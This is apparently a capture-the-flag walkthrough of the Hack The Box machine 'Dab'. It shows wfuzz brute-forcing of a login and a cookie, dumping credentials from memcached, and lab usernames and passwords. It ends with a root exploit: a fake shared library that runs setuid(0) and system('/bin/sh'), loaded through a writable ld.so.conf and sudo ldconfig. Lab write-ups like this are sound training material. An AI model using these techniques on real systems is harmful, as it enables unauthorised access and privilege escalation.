# Hackthebox dab

## Walkthrough

Starting with nmap to search some useful ports, we get that output:

![01](/assets/images/htb/dab/01.png)

We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 and both of them are nginx.

lets take a loot at ports 80 and 8080.

![02](/assets/images/htb/dab/02.png)

![03](/assets/images/htb/dab/03.png)

---

## HTTP 80

If we try to login with common login and passwords, like **admin:???**, **root:root**, **login:password** we'll only get errors returns.
Intercepting with burp, we can see the login process POST request, with 3 parameters: `username=&password=&submit=`.

![04](/assets/images/htb/dab/04.png)

---


### Fuzzing with wfuzz

Using the **wfuzz** to fuzz the login form, we can get the password.

the command line:

```wfuzz -c -u http://10.10.10.86/login -w darkweb2017-top10000.txt -d "username=admin&password=FUZZ" -hh 542```

where the "FUZZ" pace will recv the bruteforce, we can find the password **"password1"** ( -.-' )

![05](/assets/images/htb/dab/05.png)

and, after login, we can see that page:

![06](/assets/images/htb/dab/06.png)

nice output, but it's useless 4 us at now.

---

## HTTP 8080

Looking at the 8080 port again, we can see the mensage "Access denied: password authentication cookie not set". Let's fuzz again.

Using wfuzz again, but now to get the cookie we can get it.

**command line:** ```wfuzz -c -u http://10.10.10.86/login -w darkweb2017-top10000.txt -H "Cookie: password=FUZZ" -hh 324```

the output:

![07](/assets/images/htb/dab/08.png)

modifying the cookie param with burp, we get a page:

![09](/assets/images/htb/dab/09.png)

![10](/assets/images/htb/dab/10.png)

## Memcached

Memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. By default, memcached uses the following settings: - Memory allocation of 64MB - Listens for connections on all network interfaces, using port **11211** - Supports a maximum of 1024 simultaneous connections.

looking at the [Memcached cheat sheet](https://lzone.de/cheat-sheet/memcached) we can find somes commands to test. so, query the memory statistics with stats slabs.

![11](/assets/images/htb/dab/11.png)

By looking at the slab with id 26 we ca see that the chunk size of it is 27120.
dumping keys for this slab:

**stats cachedump 26 0**

* 26 it's the id
* 0 for no limit output

![users-query](/assets/images/htb/dab/12.png)

now, we can use the **get** to return the user content:

**get users**

![users-get-out](/assets/images/htb/dab/13.png)

and we got a json with a lot of users and pass.

![users-dump](/assets/images/htb/dab/14.png)

---

## Enumerating step

Using the module **json.tool** from python, we can get a more clear output.

```
cat users.txt | python -m json.tool > output.txt 
```
![clear-out](/assets/images/htb/dab/15.png)

now, let's separate users an passwords in different files.

```
cat output.txt | cut -d ":" -f 1 | cut -d '"' -f 2 > usernames.txt 
```
and:

```
cat output.txt | cut -d ":" -f 2 | cut -d '"' -f 2 > passwords.txt
```
Using msfconsole, we can enum the users with our "usernames.txt" file.

![msfprint](/assets/images/htb/dab/16.png)

It will run for a while, but, we'll found the user **genevieve**.

![user-found-msf](/assets/images/htb/dab/17.png)

now we need to get the password of that user. You can use john , hashcat or any online crackers(my case).

![password-crack](/assets/images/htb/dab/18.png)

got it! 

now, we have the credentials `genevieve:Princess1`, so, lets test on ssh.

![gotit-user](/assets/images/htb/dab/19.png)

---

## Privilege escalation

Running `sudo -l` to try get any command, we get the message **"User genevieve may run the following commands on dab: (root) /usr/bin/try_harder"**, but if we try to run it, it gets us a root shell then immediately dies after the first command and returns segfault error. 

![sudol-trol](/assets/images/htb/dab/20.png)

Using the command **find / -perm -4000** to search for binaries with suid permissions, we can see a binary kinda weird called **myexec**.

![myexec1](/assets/images/htb/dab/21.png)

that binary asks for a password. if we tries to put "root" or something similar, we'll get refused.

![myexec-refuse](/assets/images/htb/dab/22.png)

## Reversing the binary

First than first, let's download the binary on our box with scp.

```
scp genevieve@10.10.10.86:/usr/bin/myexec /.../your_path/.../
```

![myexec-download](/assets/images/htb/dab/23.png)

Now, lets debug it. In my case, i used [Radare2](https://rada.re), but you can use any other method if you want, like ltrace.

Using **"aaa"*** to analize the binary, and **pdf @ function** to disassemble a function, we get that output:

![r2-1](/assets/images/htb/dab/24.png)

![r2-2](/assets/images/htb/dab/25.png)

And, as we can see at**0x0040084d      48b873336375.  movabs rax, 0x306c337275633373** and **0x0040085b      c745a867316e.  mov dword [local_58h], 0x6e3167**, The password is **s3cur3l0g1n**. now, lets back to the box and try to put it on password input.

![pass-error](/assets/images/htb/dab/26.png)

## Dynamically linked shared object library

Using **strace** to check the syscalls, we can see that the bin loads a shared library called **libseclogin.so**

![libsec](/assets/images/htb/dab/27.png)

That's kinda weird, cuz this isn't a common sharedlib function, and that name corresponds to the **seclogin()** function that our binary calls, as we saw above. So, basically, we must build our own sharedlib **libseclogin.so**, cuz if we can replace it with another our lib and link to it, the binary will run it as root.

Before start with our libsec build, lets see some important things: How we can make **myexec** calls our lib instead the default one? maybe well, we could try to use the ld_preload. so, lets take a look aboutit. With **LD_PRELOAD** you can give libraries precedence. Ex: If you set **LD_PRELOAD** to the path of a shared object, that file will be loaded before any other library (including the C runtime, libc.so). but, that's doensn't works as well on suid binaries for security reasons. But, we have root execution on **[ldconfig](http://man7.org/linux/man-pages/man8/ldconfig.8.html)**, and as we can see, it using the config file /etc/ld.so.conf to load and cache shared libraries.

![ldsoconf](/assets/images/htb/dab/28.png)

Basically, the config says to include any `*.conf` file, and we have world-writable acess. so, we can add our own config file, that's points to our controlled folder with our builded fake sharedlib. Lets do it.

Firstly, we make a folder where we have permission to write, then we puts our fake sharelib into it, compile it and then points to it writing a .conf file at ld.so.conf. After that, we need to use ldconfig (which, as we have seen, we have root permission) to change the path.

The fake lib.c:

```
#include <stdio.h>
#include <stdlib.h>

void seclogin()
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```
Compile with:

`gcc -fPIC -shared -o libseclogin.so exploit.c`

![98](/assets/images/htb/dab/98.png)

![99](/assets/images/htb/dab/99.png)

![100](/assets/images/htb/dab/100.png)

## Concluding remarks

that's was a nice box by hackthebox, i've learn a lot. I hope somehow this post will be useful to you in life, or in some other world. Otherwise, Lets pwn the world!

---

### References

* [Set OR Change The Library Path](https://www.cyberciti.biz/faq/linux-setting-changing-library-path/)

* [ldconfig manual](https://linux.die.net/man/8/ldconfig)

* [Mysql memcached](https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf)

* [Memcached cheatsheet by lzone](https://lzone.de/cheat-sheet/memcached)